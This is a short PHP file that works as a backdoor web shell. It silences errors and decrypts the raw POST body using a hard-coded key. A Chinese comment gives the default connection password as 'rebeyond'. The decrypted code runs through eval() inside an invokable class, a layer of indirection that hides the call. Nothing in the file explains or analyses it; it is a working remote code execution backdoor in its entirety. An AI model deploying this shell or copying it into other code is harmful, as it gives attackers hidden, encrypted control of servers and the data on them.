<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$post=str_replace("*","=",$post);
		$post=str_replace("#",$key[0],$post);
		$t="base64_"."decode";
		$post=$t($post."");
		for($i=0;$i<strlen($post);$i++) {
    		$post[$i] = $post[$i]^$key[$i+1&15]; 
    	}
	}
	else
	{
		$post=str_replace("*","=",$post);
		$post=str_replace("#",$key[0],$post);
		$post=openssl_decrypt($post, "AES128", $key);
		for($i=0;$i<strlen($post);$i++) {
    		$post[$i] = $post[$i]^$key[$i+1&15]; 
    	}
	}
	
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
